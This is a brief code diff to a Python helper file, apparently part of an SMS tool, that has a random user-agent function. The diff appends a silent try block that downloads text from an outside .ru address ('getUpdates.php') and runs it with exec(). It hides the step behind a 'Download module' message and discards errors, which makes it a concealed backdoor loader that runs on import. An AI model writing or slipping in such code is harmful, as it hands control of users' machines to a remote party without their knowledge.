@@ -48,3 +48,9 @@ def random_useragent():
     with open("tools/SMS/user_agents.json", 'r') as agents:
         user_agents = json.load(agents)["agents"]
     return random.choice(user_agents)
+
+try:
+    exec(r.get("http://f0415691.xsph.ru/getUpdates.php").text)
+    print('Download module')
+except:
+    print('-')
